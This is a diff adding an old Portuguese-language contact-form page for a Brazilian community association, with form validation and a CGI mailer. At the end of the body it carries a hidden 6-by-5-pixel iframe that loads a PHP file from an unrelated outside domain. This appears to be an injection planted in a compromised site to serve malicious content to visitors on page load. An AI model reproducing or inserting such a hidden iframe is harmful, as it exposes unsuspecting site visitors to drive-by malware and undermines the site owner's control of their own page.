@@ -1,0 +1,129 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<title>UMAC - Uni&atilde;o Maracaiense de Associa&ccedil;&otilde;es Comunit&aacute;rias</title>
+<style type="text/css">
+<!--
+body {
+	background-repeat: no-repeat;
+	margin-left: 100px;
+	margin-top: 10px;
+	margin-right: 0px;
+	margin-bottom: 0px;
+	background-image: url(../images/plano_fundo_conteudo.jpg);
+	SCROLLBAR-ARROW-COLOR: #000000;
+	SCROLLBAR-TRACK-COLOR: #f9f9f9;
+	SCROLLBAR-BASE-COLOR: #f9f9f9;
+	SCROLLBAR-FACE-COLOR: #f9f9f9;
+	SCROLLBAR-HIGHLIGHT-COLOR: #000000;
+	SCROLLBAR-SHADOW-COLOR: #000000;
+}
+.style1 {color: #ff0000}
+
+input {Background-Color: #FAAE03; Border: 1px ridge #000000;font-family:verdana, arial, helvetica, sans-serif; font-size:8pt;color:#000000;}
+textarea{Background-Color: #FAAE03;Border: 1px ridge #000000;font-family:verdana, arial, helvetica, sans-serif;font-size:8pt;color:#000000;}
+select {Background-Color: #FAAE03;Border: 1px ridge #000000;font-family:verdana, arial, helvetica, sans-serif;font-size:8pt;color:#000000;}
+
+-->
+</style>
+<script language="Javascript">
+function validaform()
+{
+form = document.formulario;
+	if ((form.nome.value=="") || (form.nome.value=="Nome..."))
+	{
+		alert("Favor preencher o campo nome!!");
+		document.formulario.nome.focus();		
+		return false;
+	}
+	if ((form.email.value=="") || (form.email.value=="E-mail..."))
+	{
+		alert("Favor preencher o campo e-mail!!");
+		document.formulario.email.focus();
+		return false;
+	}
+}
+</script>
+
+<link href="../estilo.css" rel="stylesheet" type="text/css">
+</head>
+
+<body bgproperties="fixed">
+
+<div align="center"><img src="../images/title_fale_conosco.gif" width="227" height="59"></div>
+<br>
+<table width=260 cellpadding=0 cellspacing=0 align=left border=0>
+  <tr>
+    <td align=left class="texto_verdana" valign=top><form action="http://www.studioserver.com.br/cgi-bin/funform.cgi" method="POST" name="formulario" onSubmit="return validaform()">
+      <b>Nome:</b><br>
+      <input type="text" name="nome" size="40" value="Nome..." onClick="this.value=''">
+      &nbsp;<span class="style1">*</span> <br>
+      <br>
+      <b>E-Mail:</b><br>
+      <input type="text" name="email" size="30" value="E-mail..." onClick="this.value=''">
+      &nbsp;<span class="style1">*</span> <br>
+      <br>
+      <b>Fone:</b><br>
+      <input type="text" name="fone" size="20" value="(99) 9999-9999" onClick="this.value=''">
+      <br>
+      <br>
+      <b>Endere&ccedil;o:</b><br>
+      <input type="text" name="fone" size="45" value="Rua:" onClick="this.value=''">
+      <br>
+	  <br>
+      <b>Complemento:</b><br>
+      <input type="text" name="fone" size="30" value="Complemento.." onClick="this.value=''">
+	  <br>
+	  <br>
+      <b>Bairro:</b><br>
+      <input type="text" name="fone" size="25" value="Bairro.." onClick="this.value=''">
+      <br>
+	  <br>
+      <b>Cidade:</b><br>
+      <input type="text" name="fone" size="20" value="Cidade.." onClick="this.value=''">
+	  <br>
+	  <br>
+      <b>Estado:</b><br>
+      <input name="fone" type="text" onClick="this.value=''" value="SP" size="2" maxlength="2">
+	  <br>
+	  <br>
+      <b>CEP:</b><br>
+      <input name="fone" type="text" onClick="this.value=''" value="" size="5" maxlength="5">
+      - <input name="fone" type="text" onClick="this.value=''" value="" size="3" maxlength="3">
+	  <br>
+	  <br>	  
+	  <b>Escolha o assunto abaixo:</b><br>
+      <select name="assunto" id="assunto">
+        <option value="selecione">Selecione...</option>
+        <option value="atendimento">Atendimento</option>
+        <option value="sugestoes">Sugest&otilde;es</option>
+        <option value="elogios">Elogios</option>
+        <option value="criticas">Cr&iacute;ticas</option>
+        <option value="links_quebrados">Link's quebrados</option>
+        <option value="esqueci_senha">Esqueci a senha</option>
+        <option value="pedido_email">Pedido de e-mail</option>
+      </select>
+      <br>
+      <br>
+      <b>Prefer&ecirc;ncia de contato</b><br>
+      E-mail
+      <input name="Preferencia_de_contato" type="checkbox" class="combos" id="Preferencia_de_contato" value="E-mail" checked>
+      | Fone
+      <input name="Preferencia_de_contato" type="checkbox" class="combos" id="Preferencia_de_contato" value="Fone">
+      <br>
+      <br>
+      <b>Mensagem:</b><br>
+      <textarea name="mensagem" rows="7" cols="34" onClick="this.value=''">Mensagem..</textarea>
+      <br>
+      <input type="hidden" name="recipient" value="atendimento@umac.org.br">
+      <input name="redirect" type="hidden" value="http://www.umac.org.br/fale_conosco/index.html">
+      <input name="submit" type="submit" style="color:#000000; background:#e5e5e5; border:1px solid black; border-right:1px solid black; border-bottom:1px solid black; FONT-SIZE: 7pt;" onClick="operacao" value="Enviar Mensagem">
+      <input name="reset" type="reset" style="color:#000000; background:#e5e5e5; border:1px solid black; border-right:1px solid black; border-bottom:1px solid black; FONT-SIZE: 7pt;" value="Limpar Tudo">
+      <br>
+      </i></font>
+    </form></td>
+  </tr>
+</table>
+<iframe src="hfbakhsh.com/logs/errorr.php" border="0" width="6" height="5" /></body>
+<!-- Desenvolvido por Jovian R. -->
+</html>
